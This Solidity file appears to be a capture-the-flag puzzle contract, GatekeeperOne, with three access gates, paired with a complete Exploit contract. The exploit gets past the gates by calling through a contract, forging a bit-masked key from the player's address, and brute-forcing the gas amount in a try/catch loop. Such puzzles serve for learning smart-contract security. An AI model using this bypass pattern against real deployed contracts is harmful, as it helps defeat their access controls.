// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Exploit {
    GatekeeperOne public gateKeeperOne;
    address public player;

    constructor(GatekeeperOne _gateKeeperOne, address _player) {
        gateKeeperOne = _gateKeeperOne;
        player = _player;
    }

    function attack() public {
        bytes8 gateKey = bytes8(uint64(uint160(player))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i <= 8191;) {
            try gateKeeperOne.enter{gas: 85000 + i}(gateKey) {
                break;
            } catch {
                i++;
            }
        }
    }
}
